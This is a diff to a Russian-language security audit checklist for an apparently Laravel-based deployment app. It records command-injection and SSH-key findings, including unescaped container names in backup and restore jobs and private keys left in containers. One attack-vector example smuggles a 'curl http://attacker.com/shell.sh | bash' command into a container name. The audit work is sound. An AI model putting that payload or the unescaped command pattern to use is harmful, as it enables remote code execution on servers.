@@ -24,23 +24,23 @@
 
 ### Command Injection
 
-- [ ] **SSH-001**: Проверить все места где формируются SSH команды
-- [ ] **SSH-002**: Проверить escaping user input в командах
-- [ ] **SSH-003**: Проверить `ExecuteRemoteCommand` trait на injection
-- [ ] **SSH-004**: Проверить deployment scripts на command injection
+- [✅] **SSH-001**: Проверить все места где формируются SSH команды - OK (HEREDOC защита)
+- [🔴] **SSH-002**: Проверить escaping user input в командах - **CRITICAL: container names без escaping**
+- [✅] **SSH-003**: Проверить `ExecuteRemoteCommand` trait на injection - OK (HEREDOC + stdin)
+- [⚠️] **SSH-004**: Проверить deployment scripts на command injection - **containerName без escaping**
 - [🔧] **SSH-005**: Проверить docker commands construction - FIXED
 - [🔧] **SSH-006**: Проверить git commands (clone, pull) - FIXED
-- [ ] **SSH-007**: Проверить backup commands
-- [ ] **SSH-008**: Проверить database commands (psql, mysql)
+- [🔴] **SSH-007**: Проверить backup commands - **CRITICAL: связано с SSH-002**
+- [🔴] **SSH-008**: Проверить database commands (psql, mysql) - **CRITICAL: связано с SSH-002**
 
 ### Private Key Security
 
-- [ ] **SSH-009**: Проверить как хранятся private keys в БД (encryption)
-- [ ] **SSH-010**: Проверить временное хранение ключей на диске
-- [ ] **SSH-011**: Проверить permissions на временные ключи
-- [ ] **SSH-012**: Проверить cleanup временных ключей
-- [ ] **SSH-013**: Проверить key passphrase handling
-- [ ] **SSH-014**: Проверить что ключи не логируются
+- [✅] **SSH-009**: Проверить как хранятся private keys в БД (encryption) - OK (Laravel encrypted cast)
+- [⚠️] **SSH-010**: Проверить временное хранение ключей на диске - ключи остаются в контейнере
+- [✅] **SSH-011**: Проверить permissions на временные ключи - OK (0700/0600)
+- [🔴] **SSH-012**: Проверить cleanup временных ключей - **НЕТ CLEANUP после git ops!**
+- [✅] **SSH-013**: Проверить key passphrase handling - OK (не требуется для автоматизации)
+- [⚠️] **SSH-014**: Проверить что ключи не логируются - hidden=true, но нет редактирования base64
 
 ### SSH Connection Security
 
@@ -145,6 +145,82 @@ $exec = "docker exec ".escapeshellarg($containerName)." {$cmd}";
 
 **Статус:** [🔧] ИСПРАВЛЕНО
 **Исправление:** `app/Jobs/ScheduledTaskJob.php:141` - добавлен `escapeshellarg()`
+
+---
+
+#### 🔴 SSH-002: Command Injection через container names (DatabaseBackupJob, DatabaseRestoreJob)
+
+**Файлы:**
+- [DatabaseBackupJob.php](app/Jobs/DatabaseBackupJob.php) - 14+ мест
+- [DatabaseRestoreJob.php](app/Jobs/DatabaseRestoreJob.php) - 8 мест
+- [HandlesDeploymentCommands.php](app/Traits/Deployment/HandlesDeploymentCommands.php) - 2 места
+
+**Проблема:**
+```php
+// DatabaseBackupJob.php:133
+$commands[] = "docker exec $this->container_name env | grep POSTGRES_";
+
+// DatabaseRestoreJob.php:303
+$command = "docker exec -i {$this->container_name} mysql ...";
+```
+
+`$this->container_name` формируется из `$this->database->name` + UUID и вставляется в shell команды **БЕЗ `escapeshellarg()`**.
+
+**Локации без escaping в DatabaseBackupJob.php:**
+- Строки: 133, 164, 187, 229, 489, 491, 509, 511, 515, 517, 566, 571, 589, 594
+
+**Локации без escaping в DatabaseRestoreJob.php:**
+- Строки: 303, 307, 326, 330, 358, 360, 375, 395
+
+**Вектор атаки:**
+```bash
+# Если container_name = "test; curl http://attacker.com/shell.sh | bash;"
+docker exec test; curl http://attacker.com/shell.sh | bash; mysqldump ...
+# Команда curl выполнится на сервере!
+```
+
+**Рекомендация:**
+```php
+// БЫЛО (уязвимо)
+$commands[] = "docker exec $this->container_name mysqldump ...";
+
+// НУЖНО (безопасно)
+$commands[] = "docker exec ".escapeshellarg($this->container_name)." mysqldump ...";
+```
+
+**Статус:** [ ] Требует исправления
+**Severity:** CRITICAL - Remote Code Execution
+
+---
+
+#### 🔴 SSH-012: Отсутствует cleanup SSH ключей из deployment контейнера
+
+**Файлы:**
+- [HandlesGitOperations.php](app/Traits/Deployment/HandlesGitOperations.php)
+- [Application.php](app/Models/Application.php)
+
+**Проблема:**
+SSH ключ записывается в `/root/.ssh/id_rsa` внутри deployment контейнера для git операций, но **НЕ удаляется** после использования.
+
+```php
+// Ключ записывается:
+executeInDocker($this->deployment_uuid, "echo '{$private_key}' | base64 -d | tee /root/.ssh/id_rsa > /dev/null")
+
+// НО НЕТ команды удаления после git clone!
+```
+
+**Impact:**
+- Ключ остается в контейнере до его завершения
+- Может быть доступен в логах/дампах памяти процессов
+
+**Рекомендация:**
+```php
+// Добавить после завершения git операций:
+executeInDocker($this->deployment_uuid, 'rm -f /root/.ssh/id_rsa /root/.ssh/known_hosts')
+```
+
+**Статус:** [ ] Требует исправления
+**Severity:** HIGH
 
 ---
 
